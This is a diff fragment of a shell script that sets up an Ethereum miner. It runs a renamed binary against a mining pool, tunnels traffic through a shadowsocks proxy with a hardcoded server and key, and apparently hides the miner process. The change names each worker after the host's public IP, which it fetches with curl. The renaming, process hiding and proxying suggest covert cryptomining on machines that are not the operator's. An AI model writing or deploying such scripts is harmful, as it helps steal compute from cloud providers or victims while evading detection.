@@ -32,7 +32,7 @@ chmod +x 145
 apt -y install shadowsocks-libev rng-tools
 ss-local -s 192.186.186.7 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
 ph add 145
-./145 --algo ETHASH --pool eth.2miners.com:2020 --user 0x9BACCB443D4EEe6831B541ac17c28C1b61FDaB81.pukimemek
+./145 --algo ETHASH --pool eth.2miners.com:2020 --user 0x9BACCB443D4EEe6831B541ac17c28C1b61FDaB81.$(echo "$(curl -s ifconfig.me)" | tr . _ )-monakis
 EOF
 
 chmod +x run.sh
